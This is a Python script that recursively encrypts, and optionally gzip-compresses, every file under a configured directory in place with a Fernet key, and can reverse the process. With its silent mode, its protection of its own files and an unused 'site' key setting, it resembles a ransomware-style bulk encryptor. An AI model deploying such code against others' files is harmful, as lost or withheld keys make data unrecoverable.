import os
import sys
import gzip
import ctypes
import logging
import argparse
import configparser
from timeit import timeit
from cryptography.fernet import Fernet

ERROR, CRITICAL, OK, WARNING, INFO = '\033[31m', '\033[31;1m', '\033[32m', '\033[33m', '\033[34m'

# enable ansii for win32
if sys.platform == 'win32':
    ctypes.windll.kernel32.SetConsoleMode(
        ctypes.windll.kernel32.GetStdHandle(-11), 7)

parser = argparse.ArgumentParser()

parser.add_argument("--silent", action="store_true")
parser.add_argument("-cf", "--configfile", type=str,
                    default='config.conf', help='configuration file to use')
parser.add_argument("-c", "--configuration", type=str,
                    help='configuration to use')
parser.add_argument("-v", "--verbose", action="store_true",
                    help='activate verbose output.')
parser.add_argument("-d", "--decode", action="store_true",
                    help='decrypt files and not encrypt.')
parser.add_argument("--nocompression", action="store_true",
                    help='dont compress/decompress files.')



args = parser.parse_args()
cmp=args.nocompression
# configuration for logging
logging.basicConfig(format='[%(asctime)s] %(color)s%(message)s\033[0m',
                    datefmt='%H:%M:%S', level=10*(2-args.verbose+2*args.silent))

logging.debug("[i] getting configuration...", extra={"color": "\033[34m"})
config = configparser.ConfigParser()
config.read(args.configfile)
if args.configuration:
    cnf = config[args.configuration]
else:
    cnf = config.defaults()
cnf.setdefault("target", os.path.dirname(__file__))
cnf.setdefault("key", Fernet.generate_key().decode("utf-8"))
# setting defaults protected
cnf.setdefault(
    "protected", f"{os.path.abspath(__file__)},{os.path.abspath(args.configfile).casefold()},{os.path.abspath('config.conf').casefold()}")

# if already set, add to protected
cnf["protected"] += f",{os.path.abspath(__file__)},{os.path.abspath(args.configfile).casefold()},{os.path.abspath('config.conf').casefold()}"

# remove duplicates
cnf["protected"] = ','.join(set(cnf["protected"].split(",")))

cnf.setdefault("site", None)

protected = cnf["protected"].split(",")
directory = cnf.get("target")

if not cnf.get("site"):
    logging.warning("[!] no site specified: saving keys to backup",
                  extra={"color": WARNING})
    if cnf.get("save"):
        with open(cnf.get("save"), 'a') as fp:
            fp.write("\n{}".format(cnf.get("key")))
    else:
        logging.warning("[!] No save file specified: outputting key to console",
                         extra={"color": WARNING})
        logging.info(f"[i] key: {cnf.get('key')}",extra={
                    "color": INFO})

logging.debug(f"[i] configuration: {cnf}", extra={"color": INFO})

if not cmp:
    def encrypt(directory, f):
        if os.path.isdir(directory):
            for x in os.scandir(directory):
                try:
                    if os.path.abspath(x.path) not in protected:
                        if x.is_file():
                            with open(x.path, "rb") as fp:
                                content = fp.read()
                            with open(x.path, 'wb') as fp:
                                fp.write(f.encrypt(content))
                            logging.info(f"[OK] Encrypted {x.path}", extra={
                                         "color": OK})
                            logging.debug(f"[i] Compressing file: {x.path}",extra={
                                          "color": INFO})
                            #compressing file with lz4
                            with open(x.path, 'rb') as fp:
                                encrypted = fp.read()

                            with open(x.path, 'wb') as fp:
                                fp.write(gzip.compress(encrypted))

                            logging.info(f"[OK] Compressed {x.path}", extra={
                                            "color": OK})

                        elif x.is_dir():
                            logging.debug(f"[i] Encrypting directory: {x.path}", extra={
                                          "color": INFO})
                            encrypt(x.path, f)
                    else:
                        logging.debug("[i] Skipping protected file: {}".format(
                            x.path), extra={"color": INFO})
                except Exception as e:
                    logging.error(f"[ERROR] {e!r}", extra={"color": "\033[31m"})
            else:
                logging.debug("[i] No files to encrypt",
                              extra={"color": INFO})
            logging.debug("[i] Done", extra={"color": INFO})

        else:
            logging.critical("[CRITICAL] Directory is not a file.",
                             extra={"color": CRITICAL})
    def decrypt(directory, f: Fernet):
        if os.path.isdir(directory):
            for x in os.scandir(directory):
                try:
                    if os.path.abspath(x.path) not in protected:
                        if x.is_file():
                            logging.debug("[i] Decompressing file: {}".format(x.path), extra={
                                            "color": INFO})

                            with open(x.path,'rb') as fp:
                                content = fp.read()
                            #decompressing file with lz4
                            with open(x.path,'wb') as fp:
                                fp.write(gzip.decompress(content))

                            decompressed = open(x.path,'rb').read()

                            logging.info("[OK] Decompressed {}".format(x.path), extra={
                                            "color": OK})
                            logging.debug(f"[i] Decrypting {x.path}", extra={
                                            "color": INFO})
                            with open(x.path, 'wb') as fp:
                                fp.write(f.decrypt(decompressed))
                            logging.info(f"[OK] Decrypted {x.path}", extra={
                                        "color": OK})

                        elif x.is_dir():
                            logging.debug(f"[i] Decrypting directory: {x.path}", extra={
                                        "color": INFO})
                            decrypt(x.path, f)

                    else:
                        logging.debug("[i] Skipping protected file: {}".format(
                            x.path), extra={"color": INFO})
                except Exception as e:
                    logging.error(f"[ERROR] {e!r}", extra={"color": "\033[31m"})
            else:
                logging.debug("[i] No files to decrypt",
                            extra={"color": "\033[34m"})
            logging.debug("[i] Done", extra={"color": INFO})

        else:
            logging.critical("[CRITICAL] Directory is not a file.",
                            extra={"color": CRITICAL})

else:
    def encrypt(directory,f):
        if os.path.isdir(directory):
            for x in os.scandir(directory):
                try:
                    if os.path.abspath(x.path) not in protected:
                        if x.is_file():
                            with open(x.path, "rb") as fp:
                                content = fp.read()
                            with open(x.path, 'wb') as fp:
                                fp.write(f.encrypt(content))
                            logging.info(f"[OK] Encrypted {x.path}", extra={
                                         "color": OK})
                        elif x.is_dir():
                            logging.debug(f"[i] Encrypting directory: {x.path}", extra={
                                          "color": INFO})
                            encrypt(x.path, f)
                    else:
                        logging.debug("[i] Skipping protected file: {}".format(
                            x.path), extra={"color": INFO})
                except Exception as e:
                    logging.error(f"[ERROR] {e!r}", extra={"color": "\033[31m"})
            else:
                logging.debug("[i] No files to encrypt",
                              extra={"color": INFO})
            logging.debug("[i] Done", extra={"color": INFO})

        else:
            logging.critical("[CRITICAL] Directory is not a file.",
                             extra={"color": CRITICAL})
    def decrypt(directory,f):
        if os.path.isdir(directory):
            for x in os.scandir(directory):
                try:
                    if os.path.abspath(x.path) not in protected:
                        if x.is_file():
                            logging.debug("[i] Decrypting file: {}".format(x.path), extra={
                                            "color": INFO})
                            with open(x.path,'rb') as fp:
                                content = fp.read()
                            with open(x.path,'wb') as fp:
                                fp.write(f.decrypt(content))
                            logging.info(f"[OK] Decrypted {x.path}", extra={
                                        "color": OK})
                        elif x.is_dir():
                            logging.debug(f"[i] Decrypting directory: {x.path}", extra={
                                        "color": INFO})
                            decrypt(x.path, f)

                    else:
                        logging.debug("[i] Skipping protected file: {}".format(
                            x.path), extra={"color": INFO})
                except Exception as e:
                    logging.error(f"[ERROR] {e!r}", extra={"color": "\033[31m"})
            else:
                logging.debug("[i] No files to decrypt",
                            extra={"color": "\033[34m"})
            logging.debug("[i] Done", extra={"color": INFO})

        else:
            logging.critical("[CRITICAL] Directory is not a file.",
                            extra={"color": CRITICAL})



f = Fernet(cnf.get("key").encode("utf-8"))

touse = decrypt if args.decode else encrypt
logging.debug(f"[i] Finished in {timeit(lambda:touse(directory,f),number=1)}s", extra={
              "color": INFO})
